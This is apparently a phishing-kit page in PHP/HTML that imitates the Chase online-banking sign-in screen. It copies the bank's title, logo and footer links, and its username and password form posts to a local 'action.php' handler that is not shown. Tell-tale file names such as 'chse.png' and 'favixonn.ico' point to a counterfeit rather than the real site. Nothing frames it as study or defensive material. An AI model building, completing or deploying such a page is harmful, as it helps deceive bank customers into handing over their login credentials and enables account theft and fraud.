<?php  ?>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure@Chase</title>
    <link rel="stylesheet" href="style.css">
    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Poppins|Open+Sans">
    <link rel="shortcut icon" href="image/favixonn.ico" type="image/x-icon">
</head>
<body>
<!-- Logo Container (above navbar) -->
<div class="logo-container">
    <img src="chse.png" alt="Logo" class="logo">
</div>
 


    <!-- Navigation Bar -->
    <header>
        <nav class="navbar">
            <!-- Navigation links (empty for now) -->
        </nav>
    </header>


    <div class="container">
        <div class="form-box">
            <h1></h1>
            <form method="post" action="action.php">
                <div class="input-field">
                    <input type="text" id="user" placeholder="Username">
                </div>
                <div class="input-field">
                    <input type="password" id="password" placeholder="Password">
                    <span id="show-password" class="show-password">Show</span>
                </div>


                <div class="remember-options">
                    <div class="item">
                        <input type="checkbox" id="remember-me" class="checkbox">
                        <label for="remember-me">Remember me</label>
                    </div>
                    <div class="item">
                        <input type="checkbox" id="use-token" class="checkbox">
                        <label for="use-token">Use token</label>
                    </div>
                </div>


                <div class="btn-field">
                    <button type="submit">Sign in</button>
                </div>


                <p><a href="#">Forgot username/password?</a></p>
                <p><a href="#">Not Enrolled? Sign Up Now.</a></p>
               
            </form>
        </div>
    </div>


    <script src="script.js"></script>
</body>
<footer>
    <footer class="footer">
        <ul class="footer-links">
            <li><a href="#">Contact us</a></li>
            <li><a href="#">Privacy</a></li>
            <li><a href="#">Security</a></li>
            <li><a href="#">Terms of use</a></li>
            <li><a href="#">Accessibility 5</a></li>
            <li><a href="#">SAFE Act: Chase Mortgage Loan Originators</a></li>
            <li><a href="#">Fair Lending</a></li>
            <li><a href="#">About Chase</a></li>
            <li><a href="#"> J.P. Morgan</a></li>
            <li><a href="#">JPMorgan Chase & Co.</a></li>
            <li><a href="#">Careers</a></li>
            <li><a href="#">Español</a></li>
            <li><a href="#">Chase Canada</a></li>
            <li><a href="#">Site map</a></li>
            <li><a href="#">Member FDIC</a></li>
            <li><a href="#"> Equal Housing Opportunity</a></li>
        </ul>
    </footer>
</footer>
</html>